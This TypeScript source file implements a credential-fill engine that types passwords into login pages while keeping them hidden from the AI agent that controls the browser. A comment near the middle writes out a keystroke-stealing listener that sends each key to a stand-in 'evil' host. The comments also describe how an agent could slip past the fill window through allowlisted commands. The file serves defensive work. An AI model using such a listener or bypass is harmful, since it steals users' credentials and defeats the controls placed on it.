// Copyright (C) 2026 1Claw
// SPDX-License-Identifier: Apache-2.0

import type { Grant } from "@1claw/browser-bridge-protocol";
import type { CdpGate } from "./cdp-policy.js";
import type { CdpMessage, CdpTransport } from "./cdp-transport.js";
import type { SecretHandle } from "./secret-handle.js";
import type { VaultBackend } from "./vault-backend.js";

/**
 * Types a credential into a page.
 *
 * This is where every other control in the bridge is actually cashed in, so the
 * ordering is the design:
 *
 *   1. **Open the fill window first.** Before the secret exists in this
 *      process, the agent's CDP access to the target is already blocked. Doing
 *      it the other way round leaves a gap in which the agent can watch the
 *      typing it is about to be blocked from watching.
 *   2. **Navigate to the binding's own `login_url`.** Never the page the agent
 *      happens to be on — an agent that picks the URL picks who receives the
 *      password.
 *   3. **Re-check the generation immediately before typing.** Authorisation
 *      happened at some earlier instant; if the page navigated since, the
 *      credential would land in whatever loaded instead. This is the TOCTOU
 *      gap and it is closed at the last possible moment rather than the first.
 *   4. **Type from the handle, then dispose.** The secret is borrowed for the
 *      duration of the keystrokes and zeroed straight after.
 *   5. **Close the window in `finally`.** A fill that throws must not leave the
 *      agent permanently locked out of its own browser — the failure path is
 *      where a half-open window would otherwise persist.
 */

export type FillOutcome =
  | { readonly status: "filled" }
  | { readonly status: "aborted"; readonly reason: "generation_stale" | "navigated" }
  | { readonly status: "error"; readonly message: string };

export type FillEngineDeps = {
  readonly backend: VaultBackend;
  readonly transport: CdpTransport;
  readonly gate: CdpGate;
  /** Reads the target's current generation. Bumped by navigation. */
  readonly currentGeneration: (targetId: string) => number;
  /**
   * The browser context the agent's target lives in.
   *
   * The fill happens in a throwaway target created *in that same context*, so
   * the session cookie lands where the agent will use it — cookies belong to the
   * context, not the target. Without this the credential would authenticate a
   * context the agent never sees.
   */
  readonly browserContextOf?: (targetId: string) => string | undefined;
  /** How long to wait for the login field to render. */
  readonly readyTimeoutMs?: number;
  /** How long to let a submitted login finish before the page is closed. */
  readonly submitTimeoutMs?: number;
  /**
   * Where the real failure goes.
   *
   * Separate from the return value on purpose: the operator needs the detail
   * and the agent must not have it, so they cannot be the same string.
   */
  readonly onError?: (error: unknown) => void;
};

export class FillEngine {
  readonly #deps: FillEngineDeps;

  constructor(deps: FillEngineDeps) {
    this.#deps = deps;
  }

  /**
   * Perform one fill against `targetId`, using `grant`.
   *
   * Returns a status. It never returns, logs, or embeds the credential — the
   * caller is an MCP tool result, and the invariant is that a secret never
   * reaches the agent.
   */
  async fill(targetId: string, grant: Grant, selector: string): Promise<FillOutcome> {
    const { backend, transport, gate, currentGeneration } = this.#deps;

    // 1. Block the agent before the secret exists anywhere in this process.
    gate.openFillWindow(targetId);

    let handle: SecretHandle | undefined;
    let fillTarget: string | undefined;
    try {
      // 2. Type into a target the agent has never had a session on.
      //
      // Blocking CDP during the window is not enough on its own. Runtime.evaluate
      // is allowlisted *outside* a window, so an agent can install
      //
      //     addEventListener('keydown', e => fetch('https://evil/?k=' + e.key), true)
      //
      // beforehand and read the credential as it is typed, without issuing a
      // single CDP command while the window is open. The module doc for the
      // policy names this exact bypass; the allowlist twelve lines below made it
      // reachable. MutationObservers and beforeinput handlers are the same shape.
      //
      // A page the agent has never scripted has no listeners to fire. The cookie
      // still lands in the shared browser context, so the agent's own page is
      // authenticated afterwards — which is the whole point of the fill.
      const contextId = this.#deps.browserContextOf?.(targetId);
      fillTarget = await this.#createTarget(contextId);

      // 3. Window it too, immediately. Target.getTargets and
      //    Target.attachToTarget are both allowlisted, so an agent that notices
      //    the new target must still be refused on it.
      gate.openFillWindow(fillTarget);

      const sessionId = await this.#attach(fillTarget);

      // 4. The binding's URL, not the agent's.
      await this.#send({ sessionId, method: "Page.navigate", params: { url: grant.loginUrl } });
      const loginOrigin = await this.#currentUrl(sessionId);

      // 5. Navigation bumps the generation, so this catches both a page that
      //    moved on its own and one the agent moved underneath us.
      if (currentGeneration(targetId) !== grant.generation) {
        return { status: "aborted", reason: "generation_stale" };
      }

      // Wait for the field. Page.navigate resolves before the document exists,
      // so without this the focus below runs against an empty page.
      if (!(await this.#waitForSelector(sessionId, selector, this.#deps.readyTimeoutMs ?? 10_000))) {
        return { status: "error", message: "the field never appeared" };
      }

      handle = await backend.consumeFill(grant);

      // Focus, properly.
      //
      // This was `DOM.querySelector` with only a selector — a call that needs a
      // nodeId, returns nothing useful without one, and focuses nothing
      // regardless. The comment beside it named the hazard exactly ("typing
      // into whatever happens to hold focus is how a password ends up in a
      // search box") and the code then did that: Input.insertText went to no
      // field at all, and the form submitted with an empty password. Every unit
      // test passed because the fake transport answers {ok:true} to anything.
      const focused = await this.#eval(
        sessionId,
        `(() => { const el = document.querySelector(${JSON.stringify(selector)});
                  if (!el) return false; el.focus(); return document.activeElement === el; })()`,
      );
      if (focused !== true) {
        return { status: "error", message: "could not focus the field" };
      }

      // Re-check after every await that could have yielded to a navigation.
      if (currentGeneration(targetId) !== grant.generation) {
        return { status: "aborted", reason: "navigated" };
      }

      // 6. Borrow, type, and let `use` zero the buffer even if this throws.
      const text = handle.use((bytes) => new TextDecoder().decode(bytes));
      await this.#send({ sessionId, method: "Input.insertText", params: { text } });

      // 7. Submit.
      //
      // Without this the ceremony typed a password into a throwaway page and
      // closed it, so nothing ever logged in — and it reported "filled".
      await this.#submit(sessionId, selector);

      // 8. Let the submission land before `finally` closes this page.
      //
      // Firing the submit and immediately destroying the target kills the
      // request in flight: the server never sees a POST and no cookie is set.
      // The page leaving the login URL is the signal that the request
      // completed. A failed login also navigates — back to the form with an
      // error — so this waits for completion, not for success. Whether the
      // credentials were right is the agent's to discover in its own tab.
      await this.#waitForNavigation(sessionId, loginOrigin, this.#deps.submitTimeoutMs ?? 10_000);

      return { status: "filled" };
    } catch (e) {
      // Deliberately not `e.message`. This return value is handed to the agent,
      // and the thrown text comes from the backend and the transport — a driver
      // that interpolates a response body, or a vault error naming what it was
      // reading, would put that text in front of the caller this package exists
      // to keep it away from. The detail goes to the operator instead.
      this.#deps.onError?.(e);
      return { status: "error", message: "the fill did not complete" };
    } finally {
      // A handle that was consumed but never typed — because the generation
      // moved, or the transport threw — is still live until this runs.
      handle?.dispose();
      // The throwaway target goes away with the secret it was created for.
      if (fillTarget !== undefined) {
        try {
          await this.#send({ method: "Target.closeTarget", params: { targetId: fillTarget } });
        } catch {
          // Losing the close is untidy, not unsafe; the window below still shuts.
        }
        gate.closeFillWindow(fillTarget);
      }
      // 7. Always. A stuck window locks the agent out of its own browser.
      gate.closeFillWindow(targetId);
    }
  }

  /** Create the throwaway target the credential is typed into. */
  /** The page's current URL, or "" when it cannot be read. */
  async #currentUrl(sessionId: string): Promise<string> {
    const v = await this.#eval(sessionId, "location.href");
    return typeof v === "string" ? v : "";
  }

  /**
   * Wait until the page leaves `from`, or the budget runs out.
   *
   * Bounded and non-fatal: a single-page login that never changes URL still
   * completed its request, and failing the fill for that would be worse than
   * closing a moment early.
   */
  async #waitForNavigation(sessionId: string, from: string, timeoutMs: number): Promise<void> {
    const deadline = Date.now() + timeoutMs;
    while (Date.now() < deadline) {
      const now = await this.#currentUrl(sessionId).catch(() => from);
      if (now !== from && now !== "") return;
      await new Promise((r) => setTimeout(r, 100));
    }
  }

  /** Poll until a selector exists, or give up. */
  async #waitForSelector(sessionId: string, selector: string, timeoutMs: number): Promise<boolean> {
    const deadline = Date.now() + timeoutMs;
    while (Date.now() < deadline) {
      const there = await this.#eval(
        sessionId,
        `!!document.querySelector(${JSON.stringify(selector)})`,
      );
      if (there === true) return true;
      await new Promise((r) => setTimeout(r, 100));
    }
    return false;
  }

  /**
   * Submit the form the field belongs to.
   *
   * Enter first, because that is what a person does and what most login forms
   * handle — including single-page ones with no form element at all.
   * `requestSubmit()` follows for forms that ignore the key, and it runs
   * validation and fires the submit handler where `submit()` would skip both.
   * The dataset guard stops the two paths submitting twice.
   */
  async #submit(sessionId: string, selector: string): Promise<void> {
    for (const type of ["keyDown", "keyUp"] as const) {
      await this.#send({
        sessionId,
        method: "Input.dispatchKeyEvent",
        params: {
          type,
          key: "Enter",
          code: "Enter",
          windowsVirtualKeyCode: 13,
          nativeVirtualKeyCode: 13,
          ...(type === "keyDown" ? { text: "\r" } : {}),
        },
      });
    }
    await this.#eval(
      sessionId,
      `(() => { const el = document.querySelector(${JSON.stringify(selector)});
                const f = el && el.form;
                if (f && !f.dataset.oneclawSubmitted) {
                  f.dataset.oneclawSubmitted = "1";
                  if (f.requestSubmit) f.requestSubmit(); else f.submit();
                }
                return true; })()`,
    );
  }

  async #eval(sessionId: string, expression: string): Promise<unknown> {
    const out = (await this.#send({
      sessionId,
      method: "Runtime.evaluate",
      params: { expression, returnByValue: true },
    })) as { result?: { result?: { value?: unknown } } };
    return out.result?.result?.value;
  }

  async #createTarget(browserContextId: string | undefined): Promise<string> {
    const reply = await this.#send({
      method: "Target.createTarget",
      params: {
        url: "about:blank",
        ...(browserContextId !== undefined ? { browserContextId } : {}),
      },
    });
    const result = reply.result as { targetId?: unknown } | undefined;
    if (typeof result?.targetId !== "string") {
      throw new Error("Target.createTarget returned no targetId");
    }
    return result.targetId;
  }

  /**
   * Attach to the target and return the session to address it by.
   *
   * Goes straight to the transport: the gate exists to judge the agent, and the
   * bridge is the thing holding the fill window open.
   */
  async #attach(targetId: string): Promise<string> {
    const reply = await this.#send({
      method: "Target.attachToTarget",
      params: { targetId, flatten: true },
    });
    const result = reply.result as { sessionId?: unknown } | undefined;
    if (typeof result?.sessionId !== "string") {
      throw new Error("Target.attachToTarget returned no sessionId");
    }
    return result.sessionId;
  }

  /** Bridge-originated commands bypass the gate: the gate is for the agent. */
  async #send(msg: CdpMessage): Promise<CdpMessage> {
    return this.#deps.transport.send(msg);
  }
}
